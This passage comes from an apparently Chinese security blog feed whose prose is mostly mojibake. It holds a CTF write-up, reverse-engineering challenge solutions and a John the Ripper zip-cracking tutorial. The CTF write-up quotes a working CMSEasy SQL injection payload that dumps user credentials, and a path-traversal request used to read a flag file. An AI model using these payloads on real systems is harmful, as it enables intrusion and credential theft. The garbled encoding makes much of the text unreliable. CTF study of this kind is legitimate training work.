src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-58-52.jpg"></a></p><p>ç®¡ç†å‘˜è´¦æˆ·æ˜¯amdin<br>æˆ‘å…ˆæ‰¾ä¸€ä¸‹åå°å¥½äº†  è®¿é—®<code>robots.txt</code><br>å‘ç°ä¸¤ä¸ªé‡è¦çš„åœ°æ–¹</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-59-47.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-59-47.jpg"></a></p><p>ä¸€ä¸ªæ˜¯åå°åœ°å€ ä¸€ä¸ªå¥½åƒä¹Ÿæ˜¯å‘Šè¯‰æˆ‘flag åœ¨flag.php é‡Œé¢ ä½†æ˜¯ç›´æ¥è®¿é—®è¯»ä¸å‡ºæ¥</p><p>ç™¾åº¦ä¸€ä¸‹cmseasyçš„æ¼æ´ æ‰¾åˆ°ä¸€ä¸ªpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxxNaN&lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT&#x2F;**&#x2F;GROUP_CONCAT(concat(username,&#39;|&#39;,password)) from yesercms_user),20,50),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br></pre></td></tr></table></figure><p>ä¸¤æ¬¡urlç¼–ç åpostæ³¨å…¥  æ³¨å…¥ç‚¹æ˜¯<code>/celive/live/header.php</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-23-49-59.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-23-49-59.jpg"></a></p><p>æ‹¼æ¥ä¸€ä¸‹å¾—åˆ°flagçš„md5å€¼</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-23-55-46.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-23-55-46.jpg"></a></p><p>è§£å¯†å‡ºæ¥æ˜¯ <code>Yser231</code><br>è®¿é—® /index.php?admin_dir=admin&amp;site=default<br>è¿›å…¥åˆ°åå°</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-04-00-02-56.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-04-00-02-56.jpg"></a></p><p>ç„¶åå°±å„ç§æ‰¾getshell  æ²¡æœ‰ä¸€ä¸ªæˆåŠŸ<br>åæ¥å‘ç°  æœ‰ä¸€ä¸ªåœ°æ–¹ æ¨¡ç‰ˆ&gt;å½“å‰æ¨¡ç‰ˆç¼–è¾‘</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ichunqiu-sep-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ichunqiu-sep-01.jpg"></a></p><p>ç‚¹å‡»<code>ç¼–è¾‘</code>å¹¶æŠ“åŒ…</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ichunqiu-set-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ichunqiu-set-02.jpg"></a></p><p>æ”¹idä¸º<code>../../flag.php</code><br>get flag<br><code>flag&#123;0873701b-aa86-4d7c-b785-3f2c57650157&#125;</code></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹-ç™¾åº¦æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…¨å›½é«˜æ ¡ç½‘å®‰è”èµ›--é€†å‘ç¯‡</title>
      <link href="2016-NUCA-Reverse-Writeup.html"/>
      <url>2016-NUCA-Reverse-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>åšå‡ºæ¥çš„é¢˜ç›®ä¸å¤šå‘¢ åé¢è¿˜æ˜¯é ç€å¸ˆå‚…ä»¬çš„å¸®å¿™æ‰å¤šåšå‡ºæ¥äº†ä¸€ç‚¹  <strong>**</strong> å…­æ˜Ÿä¸€ç‚¹æ´»è·¯éƒ½ä¸ç»™äººç•™ï¼Œé¡ºä¾¿åæ§½ä¸€ä¸‹å‡ºé¢˜æ–¹ï¼Œä»¥åèƒ½ä¸èƒ½è‡ªå·±å…ˆæµ‹è¯•ä¸€ä¸‹å†æ”¾é¢˜é˜¿ï¼Œä¸¤ä¸ªé¢˜æœ‰é—®é¢˜ã€‚<br><a href="https://yunpan.cn/cM8iTF8Lw7XYg">é™„ä¸Šé¢˜ç›®ä»¥åŠè„šæœ¬</a>ï¼ˆæå–ç ï¼š8b00ï¼‰</p><h1 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h1><p>çœŸç­¾åˆ°é¢˜ ç›´æ¥ç»™flagå¥½å˜›ã€‚ã€‚ã€‚ å¯¹å¾—èµ·åˆ†æ•°</p><h1 id="ezpz"><a href="#ezpz" class="headerlink" title="ezpz"></a>ezpz</h1><p>64åˆ†é¢˜æ˜¯ä¸æ˜¯è¦å‘Šè¯‰æˆ‘æœ‰ <code>base64</code>é˜¿<br>æ‰¾åˆ°checkå‡½æ•°</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz.png"></a></p><p>å°±åº”è¯¥base64encode ç›´æ¥strcmp æŸ¥çœ‹<code>res</code>çš„å€¼</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz_2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz_2.png"></a></p><p>è§£ç¼–ç å°±èƒ½å¾—åˆ°flag</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz_3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-ezpz_3.png"></a></p><h1 id="Transformation"><a href="#Transformation" class="headerlink" title="Transformation"></a>Transformation</h1><p>è¿™ä¸ªé€åˆ†é¢˜ä¹Ÿæ²¡è°äº†ã€‚ã€‚æ¯”ezpzè¿˜ä¸å¦‚ã€‚ã€‚ã€‚<br>æ²¡è®°é”™çš„è¯è¿™ä¸ªå¥½åƒå°±æ˜¯flag</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Transformation_1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Transformation_1.png"></a></p><h1 id="Androidbaby"><a href="#Androidbaby" class="headerlink" title="Androidbaby"></a>Androidbaby</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Androidbaby_1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Androidbaby_1.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Androidbaby_2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Androidbaby_2.png"></a></p><p>è¾“å…¥å­—ä¸²aå…ˆä¸è‡ªå·±çš„è§’æ ‡å¼‚æˆ–ï¼Œå†ä¸{ 13, 9, 6, 9, 93, 1, 14, 84, 9, 14, 6, 91, 10, 5, 89, 6, 28, 23, 69, 65 }åˆ†åˆ«å¼‚æˆ–<br>è®°{ 13, 9, 6, 9, 93, 1, 14, 84, 9, 14, 6, 91, 10, 5, 89, 6, 28, 23, 69, 65 }ä¸ºb<br>for i in xrange(20):<br> ord(a[i])^i^b[i]<br>å¾—åˆ°20ä¸ªæ•°å­—ï¼Œé€šè¿‡(c[2*i]-48)<em>10+(c[2</em>i+1]-48)å…¬å¼ï¼Œå¾—åˆ°10ä¸ªæ•°å­— </p><p><code>ä¸‹é¢ä¸¤é¢˜æ˜¯æ±ªå¸ˆå‚…å’ŒJokeå¸ˆå‚…åšå‡ºæ¥çš„</code></p><h1 id="Babyfuscator"><a href="#Babyfuscator" class="headerlink" title="Babyfuscator"></a>Babyfuscator</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Babyfuscator_1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-Babyfuscator_1.png"></a></p><p>é¢˜å¦‚å…¶åå­— ï¼ŒçœŸæ˜¯å«ä¸€ä¸ªä¹±ä¸ƒå…«ç³Ÿé˜¿  æ¯ä¸ªå­—èŠ‚éƒ½å‚ä¸äº†è¿ç®—ã€‚ã€‚ã€‚å¥½å¤æ‚</p><p>é€šè¿‡åŠ¨æ€è°ƒè¯•ä»¥åŠå…¶ä»–çš„æ–¹æ³•å¯ä»¥æå–æŒ‡ä»¤<br>æ‹¿åˆ°æŒ‡ä»¤å çˆ†ç ´ä¸€ä¸‹å°±æ‹¿åˆ°flagäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  puts(&quot;The world is in chaos, time to show your real power:&quot;);</span><br><span class="line">  while ( v5 &lt; 32 )</span><br><span class="line">    read(0, &amp;v3[v5++], 1uLL);&#x2F;&#x2F;get_input</span><br><span class="line">  v4 &#x3D; 0;</span><br><span class="line">  game((__int64)v3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __fastcall __noreturn game(__int64 a1)</span><br><span class="line">if ( v1 + 4239419545LL &lt;&#x3D; 0xFFFFFFFFLL )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( ((unsigned __int8)((((((((((((*(_BYTE *)(a1 + 31) ^ 8) + 7) ^ 0x2C) + 6) ^ 0x3C) + 3) ^ 0x17) + 8) ^ 0x30) + 6) ^ 0x3C)</span><br><span class="line">                            + 6) ^ 0x17) &#x3D;&#x3D; 56 )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;Congratulations!The flag is %s\n&quot;, a1);</span><br><span class="line">        exit(0);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"> ç›´æ¥angrç¬¦å·æ‰§è¡Œå³å¯å¾—åˆ°flagï¼š</span><br><span class="line">find&#x3D;0x4020DF, avoid&#x3D;0x4020FE</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-brute.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-brute.png"></a></p><h1 id="indirect"><a href="#indirect" class="headerlink" title="indirect"></a>indirect</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®ä»¥å¯„å­˜å™¨å½¢å¼call</span><br><span class="line">int __cdecl sub_401140(int a1)è·å–è¾“å…¥</span><br><span class="line">&#123;</span><br><span class="line">  void *v1; &#x2F;&#x2F; ST08_4@1</span><br><span class="line">  int result; &#x2F;&#x2F; eax@1</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; malloc(0xFu);</span><br><span class="line">  (*(void (__cdecl **)(_DWORD))(*(_DWORD *)a1 + 12))(**(_DWORD **)(a1 + 8));</span><br><span class="line">  (*(void (**)(const char *, ...))(*(_DWORD *)a1 + 16))(&quot;%s&quot;, v1);&#x2F;&#x2F;get input</span><br><span class="line">  result &#x3D; *(_DWORD *)(a1 + 4);</span><br><span class="line">  *(_DWORD *)(result + 8) &#x3D; v1;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __cdecl sub_4011D0(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax@1</span><br><span class="line">  int v2; &#x2F;&#x2F; ST04_4@5</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+4h] [bp-14h]@1</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+8h] [bp-10h]@1</span><br><span class="line"></span><br><span class="line">  result &#x3D; *(_DWORD *)(a1 + 4);</span><br><span class="line">  sub_4011D0 å‡½æ•°</span><br><span class="line">v3 &#x3D; *(_DWORD *)(result + 8);</span><br><span class="line">  for ( i &#x3D; 0; i &lt; 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i + (signed __int16)(*(_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 16) + i) ^ *(_BYTE *)(i + v3) &amp; 0xF) !&#x3D; *(_DWORD *)(**(_DWORD **)(a1 + 4) + 4 * i)</span><br><span class="line">      || (signed __int16)(*(_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 20) + i) ^ (unsigned __int16)((signed int)*(_BYTE *)(i + v3) &gt;&gt; 4))</span><br><span class="line">       - i !&#x3D; *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 4) + 4 * i) )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(void (__cdecl **)(_DWORD))(*(_DWORD *)a1 + 12))(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 16));</span><br><span class="line">      v2 &#x3D; *(_DWORD *)(*(_DWORD *)(a1 + 8) + 16);</span><br><span class="line">      (*(void (__stdcall **)(_DWORD))(*(_DWORD *)a1 + 12))(0);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    result &#x3D; (*(int (__cdecl **)(_DWORD))(*(_DWORD *)a1 + 12))(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 20));</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">æŒ‰ä¸Šè¿°ç®—æ³•æŠ å‡ºå¯¹åº”çš„å››ä¸ªtableå³å¯ï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for i in range(15):</span><br><span class="line">flag_tmp1 &#x3D; (table1[i] ^ (table2[i]-i)) % 16</span><br><span class="line">flag_tmp2 &#x3D; (table3[i] ^ (table3[i]+i)) %16</span><br><span class="line">flag +&#x3D; (flag_tmp1*16 + flag_tmp2)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-indirect_1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-indirect_1.png"></a></p><p>å‘çˆ¹çš„å‡ºé¢˜äººã€‚ã€‚ + å· -å·è¦æ¢ä¸ªä½ç½®æ‰èƒ½å¾—å‡ºå¯è§å­—ç¬¦</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-indirect_2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-indirect_2.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nuca </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>John ç ´è§£rar æˆ–è€… zipå¯†ç </title>
      <link href="John-the-Ripper-password-cracker.html"/>
      <url>John-the-Ripper-password-cracker.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><blockquote><p><a href="http://www.openwall.com/john/">winç¯å¢ƒ</a><br> Ubuntu</p></blockquote><h2 id="è¦æ±‚"><a href="#è¦æ±‚" class="headerlink" title="è¦æ±‚"></a>è¦æ±‚</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential libssl-dev</span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h2><h3 id="åˆ›å»ºä¸´æ—¶ç›®å½•ç”¨æ¥ç¼–è¯‘æºä»£ç "><a href="#åˆ›å»ºä¸´æ—¶ç›®å½•ç”¨æ¥ç¼–è¯‘æºä»£ç " class="headerlink" title="åˆ›å»ºä¸´æ—¶ç›®å½•ç”¨æ¥ç¼–è¯‘æºä»£ç "></a>åˆ›å»ºä¸´æ—¶ç›®å½•ç”¨æ¥ç¼–è¯‘æºä»£ç </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir temp</span><br></pre></td></tr></table></figure><h3 id="æ”¹å˜å·¥ä½œç›®å½•"><a href="#æ”¹å˜å·¥ä½œç›®å½•" class="headerlink" title="æ”¹å˜å·¥ä½œç›®å½•"></a>æ”¹å˜å·¥ä½œç›®å½•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd temp</span><br></pre></td></tr></table></figure><h3 id="ä»å®˜ç½‘ä¸‹è½½æºä»£ç "><a href="#ä»å®˜ç½‘ä¸‹è½½æºä»£ç " class="headerlink" title="ä»å®˜ç½‘ä¸‹è½½æºä»£ç "></a>ä»å®˜ç½‘ä¸‹è½½æºä»£ç </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;www.openwall.com&#x2F;john&#x2F;j&#x2F;john-1.8.0-jumbo-1.tar.gz</span><br></pre></td></tr></table></figure><h3 id="è§£å‹ç¼©"><a href="#è§£å‹ç¼©" class="headerlink" title="è§£å‹ç¼©"></a>è§£å‹ç¼©</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xfz john-1.8.0-jumbo-1.tar.gz</span><br></pre></td></tr></table></figure><h3 id="é…ç½®è„šæœ¬"><a href="#é…ç½®è„šæœ¬" class="headerlink" title="é…ç½®è„šæœ¬"></a>é…ç½®è„šæœ¬</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd john-1.8.0-jumbo-1&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line"> .&#x2F;configure</span><br></pre></td></tr></table></figure><h3 id="ç¼–è¯‘-1"><a href="#ç¼–è¯‘-1" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -s</span><br></pre></td></tr></table></figure><h3 id="ç¼–è¯‘å¯ä»¥è¿è¡Œç›®å½•"><a href="#ç¼–è¯‘å¯ä»¥è¿è¡Œç›®å½•" class="headerlink" title="ç¼–è¯‘å¯ä»¥è¿è¡Œç›®å½•"></a>ç¼–è¯‘å¯ä»¥è¿è¡Œç›®å½•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..&#x2F;run</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»ç›®å½•ç›´æ¥æ‰§è¡Œå‘½ä»¤</p><h2 id="ç®€å•å®‰è£…"><a href="#ç®€å•å®‰è£…" class="headerlink" title="ç®€å•å®‰è£…"></a>ç®€å•å®‰è£…</h2><h3 id="ç›®å½•åˆ›å»º"><a href="#ç›®å½•åˆ›å»º" class="headerlink" title="ç›®å½•åˆ›å»º"></a>ç›®å½•åˆ›å»º</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~&#x2F;apps&#x2F;john</span><br></pre></td></tr></table></figure><h3 id="å¤åˆ¶ç¨‹åºåˆ°ç›®å½•"><a href="#å¤åˆ¶ç¨‹åºåˆ°ç›®å½•" class="headerlink" title="å¤åˆ¶ç¨‹åºåˆ°ç›®å½•"></a>å¤åˆ¶ç¨‹åºåˆ°ç›®å½•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ~&#x2F;temp&#x2F;john-1.8.0-jumbo-1&#x2F;run&#x2F;* ~&#x2F;apps&#x2F;john&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;apps&#x2F;john&#x2F; &amp;&amp; .&#x2F;john --test</span><br></pre></td></tr></table></figure><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p>æˆ‘è¿™é‡Œwindowç¯å¢ƒåšæ¼”ç¤º<br>é¦–å…ˆæˆ‘æ‰‹å¤´æœ‰ä¸€ä¸ª <code>test.zip</code> å‹ç¼©åŒ…å¯†ç æ˜¯ <code>123</code></p><h2 id="ç”¨zip2johnæˆ–è€…rar2johnæå–hashå¯†ç "><a href="#ç”¨zip2johnæˆ–è€…rar2johnæå–hashå¯†ç " class="headerlink" title="ç”¨zip2johnæˆ–è€…rar2johnæå–hashå¯†ç "></a>ç”¨zip2johnæˆ–è€…rar2johnæå–hashå¯†ç </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip2john.exe test.zip &gt; zip.hashes</span><br></pre></td></tr></table></figure><p><a href="http://oayoilchh.bkt.clouddn.com/1.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/1.png"></a></p><h2 id="johnç ´è§£hashå¯†ç "><a href="#johnç ´è§£hashå¯†ç " class="headerlink" title="johnç ´è§£hashå¯†ç "></a>johnç ´è§£hashå¯†ç </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john zip.hashes</span><br></pre></td></tr></table></figure><p>ç»“æœåº”è¯¥æ˜¯è¿™æ ·çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Loaded 1 password hash (PKZIP [32&#x2F;64])</span><br><span class="line"></span><br><span class="line">guesses: 0  time: 0:00:40:29 0.00% (3)  c&#x2F;s: 2278K  trying: eDTvw - ekTsl</span><br><span class="line">guesses: 0  time: 0:01:25:10 0.00% (3)  c&#x2F;s: 1248K  trying: ctshm#ni - ctshfon9</span><br><span class="line">guesses: 0  time: 0:02:56:40 0.00% (3)  c&#x2F;s: 1499K  trying: BR489a - BR48jf</span><br><span class="line">guesses: 0  time: 0:03:56:04 0.00% (3)  c&#x2F;s: 1703K  trying: fjmis5od - fjmidia0</span><br><span class="line">guesses: 0  time: 0:04:46:09 0.00% (3)  c&#x2F;s: 1748K  trying: Difg1ek - DifgbpS</span><br><span class="line">guesses: 0  time: 0:05:21:22 0.00% (3)  c&#x2F;s: 1855K  trying: btkululp - btkulene</span><br><span class="line">guesses: 0  time: 0:06:02:43 0.00% (3)  c&#x2F;s: 1857K  trying: ghmnymik - ghmnyasd</span><br><span class="line">test4321         (..&#x2F;test.zip)</span><br><span class="line">guesses: 1  time: 0:06:32:34 DONE (Mon Jul 28 17:50:22 2014)  c&#x2F;s: 1895K  trying: telkuwhy â€“ test43ac</span><br></pre></td></tr></table></figure><p>å¦‚æœè¦çœ‹åˆ°å¯†ç å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john zip.hashes --show</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/john-ripper-password-cracker-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/john-ripper-password-cracker-01.png"></a></p><h1 id="å…¶ä»–é“¾æ¥"><a href="#å…¶ä»–é“¾æ¥" class="headerlink" title="å…¶ä»–é“¾æ¥"></a>å…¶ä»–é“¾æ¥</h1><p><a href="https://blog.sleeplessbeastie.eu/2015/05/25/how-to-crack-archive-password-faster/">https://blog.sleeplessbeastie.eu/2015/05/25/how-to-crack-archive-password-faster/</a><br><a href="http://www.cybercrimetech.com/2014/07/how-to-cracking-zip-and-rar-protected.html">http://www.cybercrimetech.com/2014/07/how-to-cracking-zip-and-rar-protected.html</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> John </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡åœ¨æœåŠ¡å™¨ä¸Šwooyunæœç´¢ç«™çš„æ­å»º</title>
      <link href="build-the-wooyun-drops.html"/>
      <url>build-the-wooyun-drops.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>é¦–å…ˆå¿…é¡»è¦æ„Ÿè°¢ä¸€ä¸‹ <code>hancool</code>å¤§å“¥çš„å¸®å¿™é˜¿<del>~</del> è‡³å°‘å¸®æˆ‘è§£å†³äº†ä¸å°‘éº»çƒ¦</p><h1 id="wooyun-pulic"><a href="#wooyun-pulic" class="headerlink" title="wooyun_pulic"></a>wooyun_pulic</h1><p><strong>wooyunå…¬å¼€æ¼æ´ä»¥åŠçŸ¥è¯†åº“å’Œæœç´¢</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/home_wooyun.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/home_wooyun.png"></a></p><h1 id="ä¾èµ–ç»„ä»¶"><a href="#ä¾èµ–ç»„ä»¶" class="headerlink" title="ä¾èµ–ç»„ä»¶"></a>ä¾èµ–ç»„ä»¶</h1><blockquote><p>python2.7å’Œpip<br>mongodb<br>scrapy<br>flask æˆ–è€…tornado( ä¸ªäººå»ºè®®ç”¨tornado è¿™ä¸ªæ¯”è¾ƒç¨³å®š æœ‰èƒ½åŠ›çš„äººå¯ä»¥è‡ªå·±å†™ä¸€ä¸‹)<br>pymongo<br>Elasticsearch(æœç´¢å¼•æ“ï¼Œå¯é€‰)</p></blockquote><h1 